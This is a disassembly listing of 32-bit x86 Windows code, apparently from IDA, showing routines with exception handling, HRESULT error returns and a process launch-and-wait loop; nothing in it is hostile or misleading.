                mov     [esi+0B34h], edi
                jz      short loc_1A31E
                push    eax
                mov     ecx, esi
                call    sub_19A48

loc_1A31E:                              ; CODE XREF: sub_1A278+9C↑j
                call    dword ptr ds:1001148h
                push    208h
                lea     ecx, [esi+0B38h]
                push    edi
                push    ecx
                mov     [esi+40h], eax
                call    sub_16746
                push    44h ; 'D'
                lea     edx, [esi+0D40h]
                push    edi
                push    edx
                call    sub_16746
                mov     [esi+0D84h], edi
                mov     [esi+0D88h], edi
                mov     [esi+0D8Ch], edi
                add     esp, 18h
                mov     [esi+0D90h], edi
                pop     edi
                mov     eax, esi
                pop     esi
                pop     ebp
                retn    8
sub_1A278       endp

; ---------------------------------------------------------------------------
                db 0Dh dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_1A378       proc near               ; CODE XREF: sub_1ABA8+8↓p
                mov     edi, edi
                push    esi
                mov     esi, ecx
                cmp     dword ptr [esi+0AE4h], 0
                mov     dword ptr [esi], 1002800h
                jz      short loc_1A3A6
                mov     ecx, [esi+8]
                call    sub_17AF8
                mov     edx, [esi+0AE4h]
                test    edx, edx
                jz      short loc_1A3A6
                push    edx
                mov     ecx, eax
                call    sub_18D68

loc_1A3A6:                              ; CODE XREF: sub_1A378+12↑j
                                        ; sub_1A378+24↑j
                mov     eax, [esi+8]
                test    eax, eax
                jz      short loc_1A3BC
                mov     ecx, [eax]
                mov     edx, [ecx+8]
                push    eax
                call    edx
                mov     dword ptr [esi+8], 0

loc_1A3BC:                              ; CODE XREF: sub_1A378+33↑j
                lea     ecx, [esi+0B0Ch]
                call    sub_19AE8
                lea     ecx, [esi+0AF8h]
                pop     esi
                jmp     sub_19AE8
sub_1A378       endp

; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1A3D8       proc near

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ebx
                push    esi
                push    edi
                mov     edi, [ebp+arg_4]
                xor     ebx, ebx
                test    edi, edi
                jz      short loc_1A41E
                mov     esi, [ebp+arg_8]
                test    esi, esi
                jz      short loc_1A41E
                mov     ecx, [ebp+arg_0]
                add     ecx, 0AF8h
                call    sub_1A058
                test    eax, eax
                jz      short loc_1A410
                mov     [eax], edi
                pop     edi
                mov     [eax+4], esi
                pop     esi
                mov     eax, ebx
                pop     ebx
                pop     ebp
                retn    0Ch
; ---------------------------------------------------------------------------

loc_1A410:                              ; CODE XREF: sub_1A3D8+28↑j
                pop     edi
                mov     ebx, 8007000Eh
                pop     esi
                mov     eax, ebx
                pop     ebx
                pop     ebp
                retn    0Ch
; ---------------------------------------------------------------------------

loc_1A41E:                              ; CODE XREF: sub_1A3D8+F↑j
                                        ; sub_1A3D8+16↑j
                pop     edi
                pop     esi
                xor     eax, eax
                pop     ebx
                pop     ebp
                retn    0Ch
sub_1A3D8       endp

; ---------------------------------------------------------------------------
                db 11h dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1A438       proc near

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ebx
                push    esi
                push    edi
                mov     edi, [ebp+arg_4]
                xor     ebx, ebx
                test    edi, edi
                jz      short loc_1A47E
                mov     esi, [ebp+arg_8]
                test    esi, esi
                jz      short loc_1A47E
                mov     ecx, [ebp+arg_0]
                add     ecx, 0B0Ch
                call    sub_1A058
                test    eax, eax
                jz      short loc_1A470
                mov     [eax], edi
                pop     edi
                mov     [eax+4], esi
                pop     esi
                mov     eax, ebx
                pop     ebx
                pop     ebp
                retn    0Ch
; ---------------------------------------------------------------------------

loc_1A470:                              ; CODE XREF: sub_1A438+28↑j
                pop     edi
                mov     ebx, 8007000Eh
                pop     esi
                mov     eax, ebx
                pop     ebx
                pop     ebp
                retn    0Ch
; ---------------------------------------------------------------------------

loc_1A47E:                              ; CODE XREF: sub_1A438+F↑j
                                        ; sub_1A438+16↑j
                pop     edi
                pop     esi
                xor     eax, eax
                pop     ebx
                pop     ebp
                retn    0Ch
sub_1A438       endp

; ---------------------------------------------------------------------------
                db 11h dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1A498       proc near

var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    0FFFFFFFEh
                push    100AC80h
                push    1005AB7h
                mov     eax, large fs:0
                push    eax
                sub     esp, 10h
                push    ebx
                push    esi
                push    edi
                mov     eax, ds:100C088h
                xor     [ebp+var_8], eax
                xor     eax, ebp
                push    eax
                lea     eax, [ebp+var_10]
                mov     large fs:0, eax
                mov     [ebp+var_18], esp
                mov     [ebp+var_1C], 0
                xor     esi, esi
                mov     [ebp+var_4], esi
                mov     eax, [ebp+arg_C]
                push    eax
                mov     ecx, [ebp+arg_8]
                push    ecx
                mov     edx, [ebp+arg_4]
                push    edx
                mov     ecx, [ebp+arg_0]
                add     ecx, 8C4h
                call    sub_19DA8
                mov     [ebp+var_1C], eax
                mov     [ebp+var_4], 0FFFFFFFEh
                jmp     short loc_1A536
; ---------------------------------------------------------------------------
                mov     eax, [ebp+var_14]
                mov     ecx, [eax]
                mov     edx, [ecx]
                mov     [ebp+var_20], edx
                mov     eax, 1
                retn
; ---------------------------------------------------------------------------
                mov     esp, [ebp+var_18]
                mov     esi, [ebp+var_20]
                cmp     esi, 0C00000FDh
                jnz     short loc_1A523
                call    dword ptr ds:10011F4h

loc_1A523:                              ; CODE XREF: sub_1A498+83↑j
                test    esi, esi
                jl      short loc_1A52C
                mov     esi, 80004005h

loc_1A52C:                              ; CODE XREF: sub_1A498+8D↑j
                mov     [ebp+var_4], 0FFFFFFFEh
                mov     eax, [ebp+var_1C]

loc_1A536:                              ; CODE XREF: sub_1A498+65↑j
                test    eax, eax
                jl      short loc_1A53C
                mov     eax, esi

loc_1A53C:                              ; CODE XREF: sub_1A498+A0↑j
                mov     ecx, [ebp+var_10]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    10h
sub_1A498       endp

; ---------------------------------------------------------------------------
                db 8 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1A558       proc near               ; CODE XREF: sub_1A6D8+135↓p

var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_8           = dword ptr -8
var_4           = dword ptr -4

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    0FFFFFFFEh
                push    100ACA0h
                push    1005AB7h
                mov     eax, large fs:0
                push    eax
                sub     esp, 10h
                push    ebx
                push    esi
                push    edi
                mov     eax, ds:100C088h
                xor     [ebp+var_8], eax
                xor     eax, ebp
                push    eax
                lea     eax, [ebp+var_10]
                mov     large fs:0, eax
                mov     [ebp+var_18], esp
                mov     esi, ecx
                xor     ebx, ebx
                mov     [ebp+var_1C], ebx
                mov     [ebp+var_4], ebx
                push    68h ; 'h'
                lea     eax, [esi+0Ch]
                push    eax
                call    sub_18F88
                mov     [esi+74h], eax
                mov     eax, [esi+20h]
                push    eax
                call    sub_18FC8
                mov     [esi+7Ch], eax
                mov     eax, [esi+24h]
                push    eax
                call    sub_18FC8
                mov     [esi+80h], eax
                lea     ecx, [esi+0AF8h]
                call    sub_1A0C8
                mov     edi, eax
                mov     [ebp+var_1C], edi
                test    edi, edi
                jnz     short loc_1A5E4
                lea     ecx, [esi+0B0Ch]
                call    sub_1A0C8
                mov     edi, eax
                mov     [ebp+var_1C], edi

loc_1A5E4:                              ; CODE XREF: sub_1A558+7A↑j
                mov     eax, [esi+54h]
                push    eax
                call    sub_18FC8
                mov     [esi+90h], eax
                mov     eax, [esi+58h]
                push    eax
                call    sub_18FC8
                mov     [esi+94h], eax
                mov     eax, [esi+30h]
                push    eax
                call    sub_18FC8
                mov     [esi+8Ch], eax
                mov     eax, [esi+14h]
                push    eax
                call    sub_18FC8
                mov     [esi+78h], eax
                mov     eax, [esi+28h]
                push    eax
                call    sub_18FC8
                mov     [esi+84h], eax
                mov     eax, [esi+2Ch]
                push    eax
                call    sub_18FC8
                mov     [esi+88h], eax
                mov     eax, [esi+34h]
                push    eax
                call    sub_18FC8
                mov     [esi+98h], eax
                mov     eax, [esi+38h]
                push    eax
                call    sub_18FC8
                mov     [esi+9Ch], eax
                lea     ecx, [esi+8C4h]
                call    sub_199D8
                mov     [esi+0AF0h], eax
                mov     [ebp+var_4], 0FFFFFFFEh
                jmp     short loc_1A6AC
; ---------------------------------------------------------------------------
                mov     ecx, [ebp+var_14]
                mov     edx, [ecx]
                mov     eax, [edx]
                mov     [ebp+var_20], eax
                mov     eax, 1
                retn
; ---------------------------------------------------------------------------
                mov     esp, [ebp+var_18]
                mov     esi, [ebp+var_20]
                mov     ebx, esi
                cmp     esi, 0C00000FDh
                jnz     short loc_1A699
                call    dword ptr ds:10011F4h

loc_1A699:                              ; CODE XREF: sub_1A558+139↑j
                test    esi, esi
                jl      short loc_1A6A2
                mov     ebx, 80004005h

loc_1A6A2:                              ; CODE XREF: sub_1A558+143↑j
                mov     [ebp+var_4], 0FFFFFFFEh
                mov     edi, [ebp+var_1C]

loc_1A6AC:                              ; CODE XREF: sub_1A558+119↑j
                test    edi, edi
                mov     eax, ebx
                jge     short loc_1A6B4
                mov     eax, edi

loc_1A6B4:                              ; CODE XREF: sub_1A558+158↑j
                mov     ecx, [ebp+var_10]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn
sub_1A558       endp

; ---------------------------------------------------------------------------
                db 12h dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1A6D8       proc near               ; CODE XREF: sub_1ABE8+43↓p
                                        ; sub_1AC58+4A↓p

var_38          = dword ptr -38h
var_34          = dword ptr -34h
var_30          = dword ptr -30h
var_2C          = dword ptr -2Ch
var_28          = dword ptr -28h
var_24          = dword ptr -24h
var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_8           = dword ptr -8
var_4           = dword ptr -4

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    0FFFFFFFEh
                push    100ACC0h
                push    1005AB7h
                mov     eax, large fs:0
                push    eax
                sub     esp, 28h
                push    ebx
                push    esi
                push    edi
                mov     eax, ds:100C088h
                xor     [ebp+var_8], eax
                xor     eax, ebp
                push    eax
                lea     eax, [ebp+var_10]
                mov     large fs:0, eax
                mov     [ebp+var_18], esp
                mov     esi, ecx
                mov     [ebp+var_30], esi
                xor     edi, edi
                mov     [ebp+var_1C], edi
                mov     ebx, ds:100108Ch
                call    ebx
                push    eax
                call    dword ptr ds:1001090h
                mov     [ebp+var_38], eax
                cmp     eax, 7FFFFFFFh
                jz      short loc_1A73B
                push    1
                call    ebx
                push    eax
                call    dword ptr ds:1001094h

loc_1A73B:                              ; CODE XREF: sub_1A6D8+56↑j
                xor     eax, eax
                mov     [ebp+var_24], eax
                mov     [ebp+var_4], eax
                mov     ebx, [esi+60h]
                call    dword ptr ds:1001148h
                cmp     ebx, eax
                jnz     short loc_1A75B
                mov     eax, [esi+1Ch]
                cmp     dword ptr [eax], 0C00000FDh
                jz      short loc_1A782

loc_1A75B:                              ; CODE XREF: sub_1A6D8+76↑j
                mov     eax, [esi+64h]
                test    eax, 1000h
                jnz     short loc_1A782
                test    eax, 8000h
                jnz     short loc_1A782
                push    esi
                mov     ecx, [esi+8]
                call    sub_183A8
                push    eax
                push    0
                call    sub_17D88
                mov     edi, eax
                mov     [ebp+var_1C], edi

loc_1A782:                              ; CODE XREF: sub_1A6D8+81↑j
                                        ; sub_1A6D8+8B↑j ...
                mov     eax, [esi]
                push    0D94h
                push    esi
                push    esi
                mov     ecx, [eax+28h]
                call    ecx
                push    eax
                push    edi
                call    sub_17D88
                mov     edi, eax
                mov     [ebp+var_1C], edi
                mov     ecx, [esi+2Ch]
                test    ecx, ecx
                jz      short loc_1A7CF
                mov     eax, ecx
                lea     ebx, [eax+2]

loc_1A7A8:                              ; CODE XREF: sub_1A6D8+D9↓j
                mov     dx, [eax]
                add     eax, 2
                test    dx, dx
                jnz     short loc_1A7A8
                sub     eax, ebx
                sar     eax, 1
                mov     edx, [esi]
                add     eax, eax
                push    eax
                push    ecx
                push    esi
                mov     ecx, [edx+28h]
                call    ecx
                push    eax
                push    edi
                call    sub_17D88
                mov     edi, eax
                mov     [ebp+var_1C], edi

loc_1A7CF:                              ; CODE XREF: sub_1A6D8+C9↑j
                mov     edx, [esi+28h]
                test    edx, edx
                jz      short loc_1A802
                mov     eax, edx
                lea     ebx, [eax+2]

loc_1A7DB:                              ; CODE XREF: sub_1A6D8+10C↓j
                mov     cx, [eax]
                add     eax, 2
                test    cx, cx
                jnz     short loc_1A7DB
                sub     eax, ebx
                sar     eax, 1
                mov     ecx, [esi]
                add     eax, eax
                push    eax
                push    edx
                push    esi
                mov     ecx, [ecx+28h]
                call    ecx
                push    eax
                push    edi
                call    sub_17D88
                mov     edi, eax
                mov     [ebp+var_1C], edi

loc_1A802:                              ; CODE XREF: sub_1A6D8+FC↑j
                call    dword ptr ds:1001074h
                mov     [esi+44h], eax
                mov     ecx, esi
                call    sub_1A558
                push    eax
                push    edi
                call    sub_17D88
                mov     ebx, eax
                mov     [ebp+var_1C], ebx
                lea     edi, [esi+0B38h]
                lea     edx, [esi+0Ch]
                push    edx
                mov     eax, [esi+44h]
                push    eax
                push    100210Ch
                call    sub_14E89
                push    eax
                push    100287Ch
                push    104h
                push    edi
                call    sub_18228
                add     esp, 1Ch
                test    eax, eax
                jl      loc_1A9D7
                lea     eax, [esi+0D40h]
                push    eax
                call    dword ptr ds:1001130h
                xor     eax, eax
                mov     [esi+0D44h], eax
                mov     [esi+0D4Ch], eax
                lea     ebx, [esi+0D84h]
                push    ebx
                lea     eax, [esi+0D40h]
                push    eax
                push    0
                push    0
                push    0C008010h
                push    0
                push    0
                push    0
                push    edi
                mov     ecx, [esi+8]
                call    sub_17D58
                push    eax
                call    dword ptr ds:1001098h
                test    eax, eax
                jz      loc_1A9BC
                mov     [ebp+var_20], 0
                mov     [ebp+var_4], 1
                call    dword ptr ds:1001118h
                mov     [ebp+var_28], eax

loc_1A8B9:                              ; CODE XREF: sub_1A6D8+1FD↓j
                                        ; sub_1A6D8+20E↓j
                push    64h ; 'd'
                mov     ecx, [ebx]
                push    ecx
                call    dword ptr ds:100104Ch
                mov     edi, eax
                cmp     edi, 102h
                jnz     short loc_1A8E8
                cmp     dword ptr [esi+0B20h], 0FFFFFFFFh
                jz      short loc_1A8B9
                call    dword ptr ds:1001118h
                sub     eax, [ebp+var_28]
                cmp     eax, [esi+0B20h]
                jb      short loc_1A8B9

loc_1A8E8:                              ; CODE XREF: sub_1A6D8+1F4↑j
                xor     edx, edx
                cmp     edi, 102h
                setz    dl
                mov     [esi+0B2Ch], edx
                mov     dword ptr [esi+0B30h], 1
                lea     edi, [esi+0B24h]
                push    edi
                mov     eax, [ebx]
                push    eax
                call    dword ptr ds:100109Ch
                test    eax, eax
                jz      short loc_1A936
                cmp     dword ptr [edi], 103h
                jz      short loc_1A936
                mov     dword ptr [esi+0B28h], 1
                xor     ebx, ebx
                mov     [esi+0B2Ch], ebx
                mov     [ebp+var_4], ebx
                jmp     short loc_1A97B
; ---------------------------------------------------------------------------

loc_1A936:                              ; CODE XREF: sub_1A6D8+23D↑j
                                        ; sub_1A6D8+245↑j
                xor     ebx, ebx
                mov     [ebp+var_4], ebx
                jmp     short loc_1A97B
; ---------------------------------------------------------------------------
                mov     ecx, [ebp+var_14]
                mov     edx, [ecx]
                mov     eax, [edx]
                mov     [ebp+var_2C], eax
                mov     eax, 1
                retn
; ---------------------------------------------------------------------------
                mov     esp, [ebp+var_18]
                mov     esi, [ebp+var_2C]
                mov     [ebp+var_20], esi
                cmp     esi, 0C00000FDh
                jnz     short loc_1A964
                call    dword ptr ds:10011F4h

loc_1A964:                              ; CODE XREF: sub_1A6D8+284↑j
                test    esi, esi
                jl      short loc_1A96F
                mov     [ebp+var_20], 80004005h

loc_1A96F:                              ; CODE XREF: sub_1A6D8+28E↑j
                mov     [ebp+var_4], 0
                mov     esi, [ebp+var_30]
                xor     ebx, ebx

loc_1A97B:                              ; CODE XREF: sub_1A6D8+25C↑j
                                        ; sub_1A6D8+263↑j
                mov     ecx, [ebp+var_20]
                push    ecx
                mov     edx, [ebp+var_1C]
                push    edx
                call    sub_17D88
                mov     edi, eax
                mov     [ebp+var_1C], edi
                mov     eax, [esi+0D88h]
                push    eax
                call    dword ptr ds:1001054h
                mov     [esi+0D88h], ebx
                mov     ecx, [esi+0D84h]
                push    ecx
                call    dword ptr ds:1001054h
                mov     [esi+0D84h], ebx
                mov     [ebp+var_4], 0FFFFFFFEh
                jmp     short loc_1AA28
; ---------------------------------------------------------------------------

loc_1A9BC:                              ; CODE XREF: sub_1A6D8+1C4↑j
                call    dword ptr ds:1001144h
                test    eax, eax
                jle     short loc_1A9D0
                and     eax, 0FFFFh
                or      eax, 80070000h

loc_1A9D0:                              ; CODE XREF: sub_1A6D8+2EC↑j
                push    eax
                mov     edx, [ebp+var_1C]
                push    edx
                jmp     short loc_1A9D9
; ---------------------------------------------------------------------------

loc_1A9D7:                              ; CODE XREF: sub_1A6D8+174↑j
                push    eax
                push    ebx

loc_1A9D9:                              ; CODE XREF: sub_1A6D8+2FD↑j
                call    sub_17D88
                mov     edi, eax
                mov     [ebp+var_1C], edi
                mov     [ebp+var_4], 0FFFFFFFEh
                jmp     short loc_1AA28
; ---------------------------------------------------------------------------
                mov     eax, [ebp+var_14]
                mov     ecx, [eax]
                mov     edx, [ecx]
                mov     [ebp+var_34], edx
                mov     eax, 1
                retn
; ---------------------------------------------------------------------------
                mov     esp, [ebp+var_18]
                mov     esi, [ebp+var_34]
                mov     [ebp+var_24], esi
                cmp     esi, 0C00000FDh
                jnz     short loc_1AA13
                call    dword ptr ds:10011F4h

loc_1AA13:                              ; CODE XREF: sub_1A6D8+333↑j
                test    esi, esi
                jl      short loc_1AA1E
                mov     [ebp+var_24], 80004005h

loc_1AA1E:                              ; CODE XREF: sub_1A6D8+33D↑j
                mov     [ebp+var_4], 0FFFFFFFEh
                mov     edi, [ebp+var_1C]

loc_1AA28:                              ; CODE XREF: sub_1A6D8+2E2↑j
                                        ; sub_1A6D8+312↑j
                mov     eax, [ebp+var_38]
                cmp     eax, 7FFFFFFFh
                jz      short loc_1AA40
                push    eax
                call    dword ptr ds:100108Ch
                push    eax
                call    dword ptr ds:1001094h

loc_1AA40:                              ; CODE XREF: sub_1A6D8+358↑j
                test    edi, edi
                jl      short loc_1AA47
                mov     edi, [ebp+var_24]

loc_1AA47:                              ; CODE XREF: sub_1A6D8+36A↑j
                mov     eax, edi
                mov     ecx, [ebp+var_10]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn
sub_1A6D8       endp

; ---------------------------------------------------------------------------
                db 0Dh dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1AA68       proc near

var_24          = dword ptr -24h
var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    0FFFFFFFEh
                push    100ACE8h
                push    1005AB7h
                mov     eax, large fs:0
                push    eax
                sub     esp, 14h
                push    ebx
                push    esi
                push    edi
                mov     eax, ds:100C088h
                xor     [ebp+var_8], eax
                xor     eax, ebp
                push    eax
                lea     eax, [ebp+var_10]
                mov     large fs:0, eax
                mov     [ebp+var_18], esp
                xor     ebx, ebx
                mov     [ebp+var_1C], ebx
                mov     [ebp+var_20], ebx
                mov     [ebp+var_4], ebx
                push    100182Ch
                mov     esi, [ebp+arg_8]
                push    esi
                mov     edi, [ebp+arg_4]
                push    edi
                call    sub_14A14
                mov     [ebp+var_1C], eax
                cmp     eax, ebx
                jl      short loc_1AB0F
                mov     ebx, [ebp+arg_0]
                cmp     dword ptr [ebx+0D8Ch], 0
                jnz     short loc_1AAE0
                push    1002900h
                push    esi
                push    edi
                call    sub_19C38
                mov     [ebp+var_1C], eax
                test    eax, eax
                jl      short loc_1AB0F

loc_1AAE0:                              ; CODE XREF: sub_1AA68+63↑j
                cmp     dword ptr [ebx+0B30h], 0
                jz      short loc_1AB35
                cmp     dword ptr [ebx+0B2Ch], 0
                jz      short loc_1AB2A
                mov     eax, [ebx+0D8Ch]
                push    eax
                push    10028A0h
                push    esi
                push    edi
                call    sub_19458
                add     esp, 10h

loc_1AB08:                              ; CODE XREF: sub_1AA68+CB↓j
                mov     [ebp+var_1C], eax
                test    eax, eax
                jge     short loc_1AB35

loc_1AB0F:                              ; CODE XREF: sub_1AA68+57↑j
                                        ; sub_1AA68+76↑j
                mov     [ebp+var_4], 0FFFFFFFEh
                mov     ecx, [ebp+var_10]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    0Ch
; ---------------------------------------------------------------------------

loc_1AB2A:                              ; CODE XREF: sub_1AA68+88↑j
                push    esi
                push    edi
                mov     ecx, ebx
                call    sub_19F98
                jmp     short loc_1AB08
; ---------------------------------------------------------------------------

loc_1AB35:                              ; CODE XREF: sub_1AA68+7F↑j
                                        ; sub_1AA68+A5↑j
                mov     [ebp+var_4], 0FFFFFFFEh
                jmp     short loc_1AB7A
; ---------------------------------------------------------------------------
                mov     ecx, [ebp+var_14]
                mov     edx, [ecx]
                mov     eax, [edx]
                mov     [ebp+var_24], eax
                mov     eax, 1
                retn
; ---------------------------------------------------------------------------
                mov     esp, [ebp+var_18]
                mov     esi, [ebp+var_24]
                mov     [ebp+var_20], esi
                cmp     esi, 0C00000FDh
                jnz     short loc_1AB65
                call    dword ptr ds:10011F4h

loc_1AB65:                              ; CODE XREF: sub_1AA68+F5↑j
                test    esi, esi
                jl      short loc_1AB70
                mov     [ebp+var_20], 80004005h

loc_1AB70:                              ; CODE XREF: sub_1AA68+FF↑j
                mov     [ebp+var_4], 0FFFFFFFEh
                mov     eax, [ebp+var_1C]

loc_1AB7A:                              ; CODE XREF: sub_1AA68+D4↑j
                test    eax, eax
                jl      short loc_1AB81
                mov     eax, [ebp+var_20]

loc_1AB81:                              ; CODE XREF: sub_1AA68+114↑j
                mov     ecx, [ebp+var_10]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    0Ch
sub_1AA68       endp

; ---------------------------------------------------------------------------
                db 13h dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1ABA8       proc near               ; CODE XREF: sub_18588+C4↑p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, ecx
                call    sub_1A378
                push    0D94h
                push    0
                push    esi
                call    sub_16746
                add     esp, 0Ch
                test    esi, esi
                jz      short loc_1ABD8
                mov     eax, [ebp+arg_4]
                mov     ecx, [ebp+arg_0]
                push    eax
                push    ecx
                mov     ecx, esi
                call    sub_1A278

loc_1ABD8:                              ; CODE XREF: sub_1ABA8+1F↑j
                pop     esi
                pop     ebp
                retn    8
sub_1ABA8       endp

; ---------------------------------------------------------------------------
                db 0Bh dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1ABE8       proc near               ; CODE XREF: sub_1AC58+8E↓p

var_50          = byte ptr -50h
var_44          = dword ptr -44h
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 50h
                mov     eax, [ebp+arg_0]
                mov     edx, [eax+4]
                push    ebx
                push    esi
                mov     esi, [eax]
                push    edi
                mov     ebx, ecx
                mov     ecx, 14h
                lea     edi, [ebp+var_50]
                rep movsd
                mov     ecx, [ebx+0B34h]
                mov     esi, [ebx]
                push    edx
                lea     eax, [ebp+var_50]
                push    eax
                mov     [ebp+var_44], ecx
                call    dword ptr ds:1001148h
                mov     ecx, [esi+20h]
                push    eax
                push    ebx
                call    ecx
                mov     esi, [ebp+arg_4]
                mov     ecx, ebx
                mov     [esi], eax
                call    sub_1A6D8
                pop     edi
                mov     [esi], eax
                pop     esi
                mov     eax, 1
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    8
sub_1ABE8       endp

; ---------------------------------------------------------------------------
                db 18h dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1AC58       proc near

var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    0FFFFFFFEh
                push    100AD08h
                push    1005AB7h
                mov     eax, large fs:0
                push    eax
                sub     esp, 0Ch
                push    ebx
                push    esi
                push    edi
                mov     eax, ds:100C088h
                xor     [ebp+var_8], eax
                xor     eax, ebp
                push    eax
                lea     eax, [ebp+var_10]
                mov     large fs:0, eax
                mov     [ebp+var_18], esp
                mov     esi, 80004005h
                mov     [ebp+var_1C], esi
                mov     edx, [ebp+4]
                mov     ecx, [ebp+arg_0]
                mov     eax, [ecx+1Ch]
                test    eax, eax
                jz      short loc_1ACAB
                call    sub_1A6D8
                mov     esi, eax
                jmp     short loc_1ACF9
; ---------------------------------------------------------------------------

loc_1ACAB:                              ; CODE XREF: sub_1AC58+48↑j
                mov     [ebp+var_4], 0
                cmp     dword ptr [ecx+0B34h], 0
                jnz     short loc_1ACC1
                mov     [ecx+0B34h], edx

loc_1ACC1:                              ; CODE XREF: sub_1AC58+61↑j
                push    0
                push    0
                push    0
                push    42ACh
                call    dword ptr ds:1001154h
                mov     [ebp+var_4], 0FFFFFFFEh
                jmp     short loc_1ACF9
; ---------------------------------------------------------------------------
                lea     eax, [ebp+var_1C]
                push    eax
                mov     ecx, [ebp+var_14]
                push    ecx
                mov     ecx, [ebp+arg_0]
                call    sub_1ABE8
                retn
; ---------------------------------------------------------------------------
                mov     esp, [ebp+var_18]
                mov     [ebp+var_4], 0FFFFFFFEh
                mov     esi, [ebp+var_1C]

loc_1ACF9:                              ; CODE XREF: sub_1AC58+51↑j
                                        ; sub_1AC58+81↑j
                mov     eax, esi
                mov     ecx, [ebp+var_10]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    4
sub_1AC58       endp

; ---------------------------------------------------------------------------
                db 9 dup(0CCh)
; [0000002B BYTES: COLLAPSED FUNCTION __alloca_probe. PRESS CTRL-NUMPAD+ TO EXPAND]
                align 8

; =============== S U B R O U T I N E =======================================


sub_1AD48       proc near               ; CODE XREF: CODE:0001AD89↓p
                mov     ecx, [ecx+4]
                call    dword ptr ds:1001178h
                test    eax, eax
                jz      short locret_1AD5D
                mov     edx, [eax]
                push    1
                mov     ecx, eax
                call    dword ptr [edx]

locret_1AD5D:                           ; CODE XREF: sub_1AD48+B↑j
                retn
sub_1AD48       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)
; ---------------------------------------------------------------------------
                push    4
                mov     eax, 100A650h
                call    sub_165CB
                push    0
                lea     ecx, [ebp-10h]
                call    dword ptr ds:1001180h
                and     dword ptr [ebp-4], 0
                jmp     short loc_1AD95
; ---------------------------------------------------------------------------

loc_1AD80:                              ; CODE XREF: CODE:0001AD9D↓j
                mov     eax, [esi]
                mov     ecx, esi
                mov     ds:100C744h, eax
                call    sub_1AD48
                push    esi
                call    sub_16264
                pop     ecx

loc_1AD95:                              ; CODE XREF: CODE:0001AD7E↑j
                mov     esi, ds:100C744h
                test    esi, esi
                jnz     short loc_1AD80
                or      dword ptr [ebp-4], 0FFFFFFFFh
                lea     ecx, [ebp-10h]
                call    dword ptr ds:100117Ch
                call    sub_16679
                retn
; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1ADB7       proc near               ; CODE XREF: sub_1AF3D+1A↓p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_4]
                mul     [ebp+arg_8]
                test    edx, edx
                jnz     short loc_1ADD4
                cmp     eax, 0FFFFFFFFh
                ja      short loc_1ADD4
                mov     ecx, [ebp+arg_0]
                mov     [ecx], eax
                xor     eax, eax
                pop     ebp
                retn
; ---------------------------------------------------------------------------

loc_1ADD4:                              ; CODE XREF: sub_1ADB7+D↑j
                                        ; sub_1ADB7+12↑j
                mov     eax, 80070216h
                pop     ebp
                retn
sub_1ADB7       endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

